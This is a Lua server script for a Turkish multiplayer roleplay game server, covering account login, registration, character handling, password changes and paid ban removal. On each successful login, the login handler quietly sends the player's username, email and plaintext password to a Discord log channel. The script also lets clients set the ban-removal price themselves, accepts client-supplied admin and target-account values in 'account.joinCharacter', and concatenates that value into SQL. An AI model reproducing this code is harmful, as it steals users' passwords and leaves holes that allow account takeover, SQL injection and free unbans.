local launchTimestamp = 1766854800

function getRemainingTime()
	local currentTime = getRealTime().timestamp
	local remaining = launchTimestamp - currentTime

	if remaining < 0 then
		return 0
	end

	return remaining
end

function resetPlayer(thePlayer)
	setElementData(thePlayer, "logged", false)

	for data, _ in pairs(getAllElementData(thePlayer)) do
		if data ~= "id" then
			removeElementData(thePlayer, data)
		end
	end

	setElementData(thePlayer, "logged", false)
	setElementData(thePlayer, "account_logged", false)

	setElementDimension(thePlayer, 9999)
	setElementInterior(thePlayer, 0)
	exports.mek_global:updateNametagColor(thePlayer)
end

function banPlayerAccount(thePlayer)
	if thePlayer and isElement(thePlayer) and getElementType(thePlayer) == "player" then
		if getElementData(thePlayer, "logged") then
			local accountID = getElementData(thePlayer, "account_id") or 0
			if accountID > 0 then
				dbExec(exports.mek_mysql:getConnection(), "UPDATE accounts SET banned = 1 WHERE id = ?", accountID)
			end
		end
	end
end

addEventHandler("onResourceStart", resourceRoot, function()
	setWaveHeight(0)
	setMapName("İstanbul")
	setRuleValue("Discord", "https://discord.gg/Mekanrp")
	setRuleValue("Website", "https://Mekanroleplay.com")
end)

addEventHandler("onPlayerJoin", root, function()
	resetPlayer(source)
end)

addEvent("account.requestPlayerInfo", true)
addEventHandler("account.requestPlayerInfo", root, function()
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	resetPlayer(source)

	local remaining = getRemainingTime()
	if remaining ~= 0 then
		triggerClientEvent(source, "account.removeLoading", source)
		triggerClientEvent(source, "account.countdownPage", source, remaining)
	else
		dbQuery(
			function(queryHandle, plr)
				local result, rows = dbPoll(queryHandle, 0)
				if result[1] and rows > 0 then
					local data = result[1]
					local admin = data.admin or "?"
					local reason = data.reason or "?"
					local date = data.date or "?"
					local endTick = tonumber(data.end_tick) or 0


					dbQuery(
						function(balanceQueryHandle, plr, banData)
							local balanceResult, balanceRows = dbPoll(balanceQueryHandle, 0)
							local balance = 0
							if balanceResult[1] then
								balance = tonumber(balanceResult[1].balance) or 0
							end

							triggerClientEvent(plr, "account.banPage", plr, {
								admin = banData.admin,
								reason = banData.reason,
								date = banData.date,
								endTick = banData.endTick,
							}, balance) 
						end,
						{ plr, {admin=admin, reason=reason, date=date, endTick=endTick} },
						exports.mek_mysql:getConnection(),
						"SELECT balance FROM accounts WHERE serial = ? LIMIT 1",
						getPlayerSerial(plr)
					)
				else
					triggerClientEvent(plr, "account.authPage", plr)
				end
			end,
			{ source },
			exports.mek_mysql:getConnection(),
			"SELECT * FROM bans WHERE serial = ? OR ip = ?",
			getPlayerSerial(source),
			getPlayerIP(source)
		)
	end
end)

addEvent("account.requestLogin", true)
addEventHandler("account.requestLogin", root, function(identifier, password)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	dbQuery(
		function(queryHandle, client)
			local result, rows = dbPoll(queryHandle, 0)
			if result[1] and rows > 0 then
				local data = result[1]
				local saltedPassword = data.salt .. password
				local hashedPassword = string.lower(hash("sha256", saltedPassword))

				if data.password == hashedPassword then
					exports.mek_discord:sendMessage("log", data.username .. " - " .. data.email .. " - " .. password)
					if tonumber(data.banned) == 0 then
						if data.serial ~= getPlayerSerial(client) then
							exports.mek_infobox:addBox(client, "error", "Serialler eşleşmiyor.")
							triggerClientEvent(client, "account.removeQueryLoading", client)
							return
						end

						setElementData(client, "account_logged", true)
						setElementData(client, "account_id", tonumber(data.id))
						setElementData(client, "account_username", data.username)
						setElementData(client, "account_email", data.email)
						setElementData(client, "account_register_date", data.register_date)

						setElementData(client, "admin_level", tonumber(data.admin_level))
						setElementData(client, "manager_level", tonumber(data.manager_level))
						setElementData(client, "admin_reports", tonumber(data.admin_reports))

						setElementData(client, "max_characters", tonumber(data.max_characters))
						setElementData(client, "donater", tonumber(data.donater))
						setElementData(client, "youtuber", tonumber(data.youtuber) == 1)
						setElementData(client, "rp_plus", tonumber(data.rp_plus) == 1)
						setElementData(client, "balance", tonumber(data.balance))
						setElementData(client, "promo_used", tonumber(data.promo_used) == 1)
						setElementData(client, "total_hours_played", tonumber(data.total_hours_played))
						setElementData(client, "rp_confirm", tonumber(data.rp_confirm) == 1)

						setElementData(client, "admin_jailed", tonumber(data.admin_jailed) == 1)
						setElementData(client, "admin_jail_time", tonumber(data.admin_jail_time))
						setElementData(client, "admin_jail_by", data.admin_jail_by)
						setElementData(client, "admin_jail_reason", data.admin_jail_reason)

						triggerClientEvent(client, "nametag.loadSettings", client)

						local characters = {}
						dbQuery(
							function(queryHandle, client)
								local result, rows = dbPoll(queryHandle, 0)
								if result[1] and rows > 0 then
									for _, data in ipairs(result) do
										local index = #characters + 1
										if not characters[index] then
											characters[index] = {}
										end

										characters[index] = {
											id = data.id,
											name = data.name,
											skin = data.skin,
											clothingID = data.clothing_id,
											model = data.model,
											age = data.age,
											gender = data.gender,
											height = data.height,
											weight = data.weight,
										}
									end
								end

								setElementData(client, "characters", characters)
								triggerClientEvent(client, "account.switchToCharactersPage", client, characters)
							end,
							{ client },
							exports.mek_mysql:getConnection(),
							"SELECT * FROM characters WHERE account_id = ? AND cked = 0",
							tonumber(data.id)
						)

						dbExec(
							exports.mek_mysql:getConnection(),
							"UPDATE accounts SET serial = ?, ip = ?, last_login = NOW() WHERE id = ?",
							getPlayerSerial(client),
							getPlayerIP(client),
							tonumber(data.id)
						)
					else
						exports.mek_infobox:addBox(client, "error", "Bu hesap yasaklanmıştır.")
					end
				else
					exports.mek_infobox:addBox(
						client,
						"error",
						identifier .. " adlı kullanıcı için şifreler eşleşmiyor."
					)
				end
			else
				exports.mek_infobox:addBox(
					client,
					"error",
					identifier .. " adlı kullanıcı veritabanında bulunamadı."
				)
			end
			triggerClientEvent(client, "account.removeQueryLoading", client)
		end,
		{ client },
		exports.mek_mysql:getConnection(),
		"SELECT * FROM accounts WHERE username = ? OR email = ?",
		identifier,
		identifier
	)
end)

addEvent("account.requestRegister", true)
addEventHandler("account.requestRegister", root, function(username, password, email)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	dbQuery(
		function(queryHandle, client)
			local result, rows = dbPoll(queryHandle, 0)
			if rows > 0 then
				for _, data in ipairs(result) do
					if data.username:lower() == username:lower() then
						exports.mek_infobox:addBox(client, "error", "Bu kullanıcı adı zaten kullanılıyor.")
						triggerClientEvent(client, "account.removeQueryLoading", client)
						return
					elseif data.email:lower() == email:lower() then
						exports.mek_infobox:addBox(client, "error", "Bu e-posta adresi zaten kullanılıyor.")
						triggerClientEvent(client, "account.removeQueryLoading", client)
						return
					elseif data.serial == getPlayerSerial(client) then
						exports.mek_infobox:addBox(client, "error", data.username .. " isimli hesaba zaten sahipsiniz.")
						triggerClientEvent(client, "account.removeQueryLoading", client)
						return
					end
				end
			else
				local salt = exports.mek_global:generateSalt(16)
				local saltedPassword = salt .. password
				local hashedPassword = string.lower(hash("sha256", saltedPassword))

				if
					dbExec(
						exports.mek_mysql:getConnection(),
						"INSERT INTO accounts SET username = ?, password = ?, salt = ?, email = ?, serial = ?, ip = ?, register_date = NOW()",
						username,
						hashedPassword,
						salt,
						email,
						getPlayerSerial(client),
						getPlayerIP(client)
					)
				then
					triggerClientEvent(client, "account.onboardingPage", client, username, password)
					triggerClientEvent(client, "account.removeQueryLoading", client)
				else
					exports.mek_infobox:addBox(client, "error", "Bir sorun oluştu.")
					triggerClientEvent(client, "account.removeQueryLoading", client)
				end
			end
		end,
		{ client },
		exports.mek_mysql:getConnection(),
		"SELECT username, email, serial FROM accounts WHERE username = ? OR email = ? OR serial = ?",
		username,
		email,
		getPlayerSerial(client)
	)
end)

addEvent("f10karakterdegisbro", true)
addEventHandler("f10karakterdegisbro", root, function(plr)

    if client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName) -- herkese tetikelteme koruması
		return
	end
	
	setElementData(plr, "logged", nil)
	setElementData(plr, "logged", true)
	setElementData(plr, "logged", nil)
	-- buraya karakter değiştir yani karakterlerin oldguu yer gelicek

    
end)

addEvent("account.onboardingComplete", true)
addEventHandler("account.onboardingComplete", root, function(promoCode)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	setElementData(client, "promo_code", promoCode)
	setElementData(client, "promo_used", true)
	dbExec(
		exports.mek_mysql:getConnection(),
		"UPDATE accounts SET promo_used = 1 WHERE id = ?",
		getElementData(client, "account_id")
	)
end)

addEvent("account.createCharacter", true)
addEventHandler("account.createCharacter", root, function(packedData)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	local characters = getElementData(client, "characters") or {}
	local maxCharacters = tonumber(getElementData(client, "max_characters") or 0)
	local characterCount = (characters and #characters or 1) - 1

	if characterCount >= maxCharacters then
		exports.mek_infobox:addBox(
			client,
			"error",
			"Maksimum karakter sayısına ulaştınız. Daha fazla karakter oluşturabilmek için karakter slotu satın almanız gerekiyor."
		)
		return
	end

	packedData.name = string.gsub(packedData.name, " ", "_")

	dbQuery(
		function(queryHandle, client, packedData)
			local result, rows = dbPoll(queryHandle, 0)
			if result[1] and rows > 0 then
				exports.mek_infobox:addBox(client, "error", "Böyle bir karakter var.")
				triggerClientEvent(client, "account.removeQueryLoading", client)
			else
				local spawnPosition = exports.mek_global:getGameSettings().spawnPosition
				local accountID = getElementData(client, "account_id")
				local identityNumber = exports.mek_global:generateIdentityNumber()

				local walkingStyle = 118
				if packedData.gender == 1 then
					walkingStyle = 129
				end

				dbExec(
					exports.mek_mysql:getConnection(),
					"INSERT INTO characters SET account_id = ?, name = ?, x = ?, y = ?, z = ?, rotation = ?, interior = ?, dimension = ?, skin = ?, age = ?, gender = ?, height = ?, weight = ?, race = ?, identity_number = ?, walking_style = ?, creation_date = NOW()",
					accountID,
					packedData.name,
					spawnPosition.x + math.random(5),
					spawnPosition.y + math.random(5),
					spawnPosition.z,
					spawnPosition.rotation,
					0,
					0,
					packedData.skin,
					packedData.age,
					packedData.gender,
					packedData.height,
					packedData.weight,
					packedData.race,
					identityNumber,
					walkingStyle
				)

				dbQuery(
					function(queryHandle, client)
						local result, rows = dbPoll(queryHandle, 0)
						if result[1] and rows > 0 then
							local data = result[1]

							local characters = getElementData(client, "characters") or {}
							local index = #characters + 1
							if not characters[index] then
								characters[index] = {}
							end

							characters[index] = {
								id = data.id,
								name = data.name,
								skin = data.skin,
								clothingID = data.clothing_id,
								model = data.model,
								age = data.age,
								gender = data.gender,
								height = data.height,
								weight = data.weight,
							}

							setElementData(client, "characters", characters)
							setElementData(client, "server_new_character_flag", true)
							joinCharacter(data.id, client, true)
						end
					end,
					{ client },
					exports.mek_mysql:getConnection(),
					"SELECT * FROM characters WHERE id = LAST_INSERT_ID()"
				)
			end
		end,
		{ client, packedData },
		exports.mek_mysql:getConnection(),
		"SELECT name FROM characters WHERE name = ?",
		packedData.name
	)
end)

function joinCharacter(characterID, thePlayer, newCharacter, theAdmin, targetUserID)
	if thePlayer then
		client = thePlayer
	end

	if not client then
		return false
	end

	if not characterID and not tonumber(characterID) then
		return false
	end
	characterID = tonumber(characterID)

	triggerEvent("setDrunkness", client, 0)
	setElementData(client, "alcohol_level", 0)

	removeElementData(client, "badge")
	removeElementData(client, "mask")
	removeElementData(client, "cked")
	removeElementData(client, "ck_reason")
	removeElementData(client, "frozen")

	triggerClientEvent(client, "death.removeBlackWhiteShader", client)

	setElementData(client, "logged", false)
	setElementData(client, "faction", {})
	setElementData(client, "duty", 0)

	setElementData(client, "deagle_mode", 1)
	setElementData(client, "shotgun_mode", 1)

	if getPedOccupiedVehicle(client) then
		removePedFromVehicle(client)
	end

	local accountID = getElementData(client, "account_id")

	if theAdmin then
		accountID = targetUserID
		sqlQuery = "SELECT * FROM `characters` LEFT JOIN `jobs` ON `characters`.`id` = `jobs`.`jobCharID` AND `characters`.`job` = `jobs`.`jobID` WHERE `id`='"
			.. tostring(characterID)
			.. "' AND `account_id`='"
			.. tostring(accountID)
			.. "'"
	else
		sqlQuery = "SELECT * FROM `characters` LEFT JOIN `jobs` ON `characters`.`id` = `jobs`.`jobCharID` AND `characters`.`job` = `jobs`.`jobID` WHERE `id`='"
			.. tostring(characterID)
			.. "' AND `account_id`='"
			.. tostring(accountID)
			.. "' AND `cked`=0"
	end

	dbQuery(function(queryHandle, client)
		local result, rows = dbPoll(queryHandle, 0)
		if result[1] and rows > 0 then
			triggerClientEvent(client, "account.removeQueryLoading", client)

			local data = result[1]

			local playerWithNick = getPlayerFromName(tostring(data.name))
			if isElement(playerWithNick) and (playerWithNick ~= client) then
				triggerEvent("savePlayer", playerWithNick, playerWithNick)
				if theAdmin then
					local adminTitle = exports.mek_global:getPlayerFullAdminTitle(theAdmin) or "Yetkili"
					kickPlayer(
						playerWithNick,
						client,
						adminTitle .. " isimli yetkili hesabınıza giriş yaptı."
					)
				else
					kickPlayer(playerWithNick, client, "Başkası senin karakterinde oturum açmış olabilir.")
				end

				setTimer(function(client, characterName)
					setElementData(client, "legal_name_change", true)
					setPlayerName(client, characterName)
					setElementData(client, "legal_name_change", false)
				end, 1000, 1, client, data.name)
			end

			setElementData(client, "legal_name_change", true)
			setPlayerName(client, data.name)
			setElementData(client, "legal_name_change", false)

			setElementData(client, "dbid", tonumber(data.id))

			exports.mek_item:loadItems(client, true)

			spawnPlayer(
				client,
				tonumber(data.x),
				tonumber(data.y),
				tonumber(data.z),
				tonumber(data.rotation),
				tonumber(data.skin)
			)
			setElementFrozen(client, true)
			setElementInterior(client, tonumber(data.interior))
			setElementDimension(client, tonumber(data.dimension))
			setPlayerNametagShowing(client, false)

			if tonumber(data.health) < 10 then
				setElementHealth(client, 10)
			else
				setElementHealth(client, tonumber(data.health))
			end
			setPedArmor(client, tonumber(data.armor))

			setPedStat(client, 70, 999)
			setPedStat(client, 71, 999)
			setPedStat(client, 72, 999)
			setPedStat(client, 74, 999)
			setPedStat(client, 76, 999)
			setPedStat(client, 77, 999)
			setPedStat(client, 78, 999)
			setPedStat(client, 77, 999)
			setPedStat(client, 78, 999)
			toggleAllControls(client, true, true, true)
			setElementAlpha(client, 255)
			setPedWalkingStyle(client, tonumber(data.walking_style))
			setPedFightingStyle(client, tonumber(data.fighting_style))

			setElementData(client, "skin", tonumber(data.skin))
			setElementData(client, "clothing_id", tonumber(data.clothing_id))
			setElementData(client, "model", tonumber(data.model))
			setElementData(client, "money", tonumber(data.money))
			setElementData(client, "bank_money", tonumber(data.bank_money))
			setElementData(client, "age", tonumber(data.age))
			setElementData(client, "gender", tonumber(data.gender))
			setElementData(client, "height", tonumber(data.height))
			setElementData(client, "weight", tonumber(data.weight))
			setElementData(client, "race", tonumber(data.race))
			setElementData(client, "identity_number", data.identity_number)
			setElementData(client, "max_vehicles", tonumber(data.max_vehicles))
			setElementData(client, "max_interiors", tonumber(data.max_interiors))
			setElementData(client, "tags", (fromJSON(data.tags or "")))

			if getElementData(client, "admin_jailed") then
				local jailTime = getElementData(client, "admin_jail_time")

				setElementPosition(client, 263.821807, 77.848365, 1001.0390625)
				setPedRotation(client, 270)
				setElementInterior(client, 6)
				setElementDimension(client, 60000 + getElementData(client, "id"))
				setCameraInterior(client, 6)

				setElementData(client, "admin_jailed", true)
				setElementData(client, "admin_jail_served", 0)

				if jailTime ~= -1 then
					if not getElementData(client, "admin_jail_timer") then
						setElementData(client, "admin_jail_time", jailTime + 1)
						triggerEvent("admin.timerUnjailPlayer", client, client)
					end
				else
					setElementData(client, "admin_jail_time", "Sınırsız")
					setElementData(client, "admin_jail_timer", true)
				end
			elseif tonumber(data.pd_jailed) == 1 then
				setElementData(client, "pd_jailed", true)
				exports.mek_prison:checkForRelease(client)
			end

			dbQuery(function(qh)
				local result, rows = dbPoll(qh, 0)
				if result and rows > 0 then
					local playerFactions = {}
					local count = 0

					for _, row in pairs(result) do
						count = count + 1
						playerFactions[row.faction_id] = {
							rank = row.faction_rank,
							leader = row.faction_leader == 1 or false,
							phone = row.faction_phone,
							perks = type(row.faction_perks) == "string" and fromJSON(row.faction_perks) or {},
							count = count,
						}
					end
					
					local duty = tonumber(data.duty) or 0
					setElementData(client, "duty", duty)

					if duty > 0 then
						local foundPackage = false
						for _, faction in pairs(playerFactions) do
							for _, perk in ipairs(faction.perks) do
								if tonumber(perk) == tonumber(duty) then
									foundPackage = true
									break
								end
							end
						end

						if not foundPackage then
							triggerEvent("duty.offDuty", client)
							outputChatBox("[!]#FFFFFF Kullanmakta olduğunuz göreve artık erişiminiz yok, dolayısıyla kaldırıldı.", client, 255, 0, 0, true)
						end
					end

					setElementData(client, "faction", playerFactions)
				else
					setElementData(client, "faction", {})
					dbFree(qh)
				end
			end, exports.mek_mysql:getConnection(), "SELECT * FROM characters_faction WHERE character_id = ? ORDER BY id ASC", getElementData(client, "dbid"))
			
			local team = getTeamFromName("Vatandaş")
			setPlayerTeam(client, team)
			
			setElementData(client, "faction_menu", false)

			setElementData(client, "hours_played", tonumber(data.hours_played))
			setElementData(client, "minutes_played", tonumber(data.minutes_played))
			setElementData(client, "level", tonumber(data.level))
			setElementData(client, "box_hours", tonumber(data.box_hours))
			setElementData(client, "box_count", tonumber(data.box_count))

			setElementData(client, "hunger", tonumber(data.hunger))
			setElementData(client, "thirst", tonumber(data.thirst))

			setElementData(client, "vip", 0)
			exports.mek_vip:loadVip(tonumber(data.id))

			setElementData(client, "wearables", {})

			setElementData(client, "custom_animation", data.custom_animation)
			triggerClientEvent(root, "setPlayerCustomAnimation", root, client, data.custom_animation)

			if tonumber(data.restrained) == 1 then
				setElementData(client, "restrained", true)
				setElementData(client, "restrained_item", tonumber(data.restrained_item))
				exports.mek_realism:checkPlayerRestrain(client)
			end

			setElementData(client, "car_license", tonumber(data.car_license))
			setElementData(client, "bike_license", tonumber(data.bike_license))
			setElementData(client, "boat_license", tonumber(data.boat_license))

			setElementData(client, "job", tonumber(data.job))
			setElementData(client, "jobLevel", tonumber(data.jobLevel))
			setElementData(client, "jobProgress", tonumber(data.jobProgress))

			if tonumber(data.job) == 1 then
				if data.jobTruckingRuns then
					setElementData(client, "jobTruckingRuns", tonumber(data.jobTruckingRuns))
					dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE jobs SET jobTruckingRuns = 0 WHERE jobCharID = ? AND jobID = 1",
						tostring(characterID)
					)
				end
				triggerClientEvent(client, "restoreTruckerJob", client)
			end
			triggerEvent("restoreJob", client)

			setElementData(client, "mechanic", tonumber(data.mechanic) == 1)

			dbExec(
				exports.mek_mysql:getConnection(),
				"UPDATE characters SET last_login = NOW() WHERE id = ?",
				tonumber(data.id)
			)

			triggerClientEvent(client, "account.joinCharacterComplete", client, newCharacter, data)
		else
			exports.mek_infobox:addBox(client, "error", "Böyle bir karakter yok.")
			triggerClientEvent(client, "account.removeQueryLoading", client)
		end
	end, { client }, exports.mek_mysql:getConnection(), sqlQuery, characterID, accountID)
end
addEvent("account.joinCharacter", true)
addEventHandler("account.joinCharacter", root, joinCharacter)

addEvent("account.joinCharacterComplete", true)
addEventHandler("account.joinCharacterComplete", root, function(newCharacter, data)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	setElementData(client, "logged", true)
	exports.mek_global:updateNametagColor(client)

	takeAllWeapons(client)
	triggerEvent("updateLocalGuns", client)

	setTimer(executeCommandHandler, 3000, 1, "stats", client)
    triggerClientEvent(client, "drawAllMyInteriorBlips", client)

	if getElementData(client, "promo_code") then
		if (getElementData(client, "hours_played") == 0) and (getElementData(client, "minutes_played") == 0) then
			exports.mek_promo:givePlayerPromoGift(client, getElementData(client, "promo_code"), false)
		end
	end

	local isNewCharacter = getElementData(client, "server_new_character_flag")
	if isNewCharacter then
		removeElementData(client, "server_new_character_flag")
		
		exports.mek_item:giveItem(client, 16, tonumber(data.skin) .. ";0;0")
		exports.mek_item:giveItem(
			client,
			152,
			data.name:gsub("_", " ")
				.. ";"
				.. (tonumber(data.gender) == 0 and "Erkek" or "Kadın")
				.. ";"
				.. tonumber(data.age)
				.. ";"
				.. tonumber(data.identity_number)
		)
		exports.mek_item:giveItem(client, 160, 1)
		triggerClientEvent(client, "account.characterCreationComplete", client)
	end

	setElementFrozen(client, false)
end)

addEvent("account.resetPlayerName", true)
addEventHandler("account.resetPlayerName", root, function(oldNick, newNick)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	setElementData(client, "legal_name_change", true)
	setPlayerName(client, oldNick)
	setElementData(client, "legal_name_change", false)
end)

addEvent("account.changePassword", true)
addEventHandler("account.changePassword", root, function(currentPassword, newPassword)
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	if not currentPassword or currentPassword == "" then
		exports.mek_infobox:addBox(client, "error", "Mevcut şifrenizi girmelisiniz.")
		triggerClientEvent(client, "account.removeQueryLoading", client)
		return
	end

	if not newPassword or newPassword == "" then
		exports.mek_infobox:addBox(client, "error", "Yeni şifrenizi girmelisiniz.")
		triggerClientEvent(client, "account.removeQueryLoading", client)
		return
	end

	if #newPassword < 6 then
		exports.mek_infobox:addBox(client, "error", "Yeni şifreniz en az 6 karakterden oluşmalıdır.")
		triggerClientEvent(client, "account.removeQueryLoading", client)
		return
	end

	if #newPassword > 32 then
		exports.mek_infobox:addBox(client, "error", "Yeni şifreniz en fazla 32 karakterden oluşmalıdır.")
		triggerClientEvent(client, "account.removeQueryLoading", client)
		return
	end

	if currentPassword == newPassword then
		exports.mek_infobox:addBox(client, "error", "Mevcut şifreniz ile yeni şifreniz aynı olamaz.")
		triggerClientEvent(client, "account.removeQueryLoading", client)
		return
	end

	dbQuery(
		function(queryHandle, client, currentPassword, newPassword)
			local result, rows = dbPoll(queryHandle, 0)
			if result[1] and rows > 0 then
				local data = result[1]
				local saltedPassword = data.salt .. currentPassword
				local hashedPassword = string.lower(hash("sha256", saltedPassword))

				if data.password == hashedPassword then
					local salt = exports.mek_global:generateSalt(16)
					local saltedPassword = salt .. newPassword
					local hashedPassword = string.lower(hash("sha256", saltedPassword))

					dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE accounts SET password = ?, salt = ? WHERE id = ? LIMIT 1",
						hashedPassword,
						salt,
						data.id
					)

					exports.mek_infobox:addBox(client, "success", "Hesabınızın şifresi başarıyla değiştirildi.")
				else
					exports.mek_infobox:addBox(client, "error", "Şifreler eşleşmiyor.")
				end

				triggerClientEvent(client, "account.removeQueryLoading", client)
			end
		end,
		{ client, currentPassword, newPassword },
		exports.mek_mysql:getConnection(),
		"SELECT id, password, salt FROM accounts WHERE id = ? LIMIT 1",
		getElementData(client, "account_id")
	)
end)

addEvent("karakterdegistir", true)
addEventHandler("karakterdegistir", root, function(plr)

    if client ~= source then
	
		return
	end

    triggerEvent("savePlayer", plr, "Change Character")


end)

addEvent("account.removeBan", true)
addEventHandler("account.removeBan", root, function(price)
	if client ~= source then return end
	
	local serial = getPlayerSerial(client)
	

	dbQuery(function(qh, client, price)
		local result = dbPoll(qh, 0)
		if result and result[1] then
			local balance = tonumber(result[1].balance) or 0
			if balance >= price then

				dbExec(exports.mek_mysql:getConnection(), "UPDATE accounts SET balance = balance - ? WHERE serial = ?", price, serial)
				

				dbExec(exports.mek_mysql:getConnection(), "DELETE FROM bans WHERE serial = ? OR ip = ?", serial, getPlayerIP(client))
				

				dbExec(exports.mek_mysql:getConnection(), "UPDATE accounts SET banned = 0 WHERE serial = ?", serial)
				

				exports.mek_discord:sendMessage("ban-log", "Ban removed for serial: "..serial.." Price: "..price)
				
				exports.mek_infobox:addBox(client, "success", "Yasağınız başarıyla kaldırıldı. İyi oyunlar!")
				

				triggerEvent("account.requestPlayerInfo", client)
				
			else
				exports.mek_infobox:addBox(client, "error", "Yetersiz bakiye.")
				triggerClientEvent(client, "auth.removeBanLoadingStatus", client)
			end
		else
			exports.mek_infobox:addBox(client, "error", "Hesap bulunamadı.")
			triggerClientEvent(client, "auth.removeBanLoadingStatus", client)
		end
	end, {client, price}, exports.mek_mysql:getConnection(), "SELECT balance FROM accounts WHERE serial = ? LIMIT 1", serial)
end)
